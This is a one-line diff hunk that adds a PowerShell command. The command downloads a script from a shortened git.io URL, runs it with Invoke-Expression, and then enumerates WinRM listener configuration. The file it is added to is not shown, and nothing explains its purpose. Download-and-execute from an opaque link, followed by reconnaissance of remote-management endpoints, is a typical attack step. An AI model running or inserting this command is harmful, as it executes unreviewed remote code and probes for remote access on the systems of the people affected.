@@ -1,0 +1,1 @@
+iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JM6Fc')); winrm enumerate winrm/config/Listener
